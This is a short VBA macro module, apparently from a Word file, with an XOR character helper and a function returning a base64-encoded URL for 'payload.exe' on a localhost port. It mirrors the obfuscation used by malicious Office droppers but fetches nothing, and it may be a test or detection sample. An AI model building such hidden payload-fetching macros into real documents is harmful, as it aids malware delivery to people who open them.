Attribute VB_Name = "NewMacros"
Public Function XorChar(ByVal c As String) As String
    XorChar = Chr(Asc(c) Xor 42)
End Function

Public Function OblivionXDecoy() As String
    Dim b64 As String
    b64 = "aHR0cDovLzEyNy4wLjAuMTo5MDkwL3BheWxvYWQuZXhl"
    OblivionXDecoy = b64
End Function
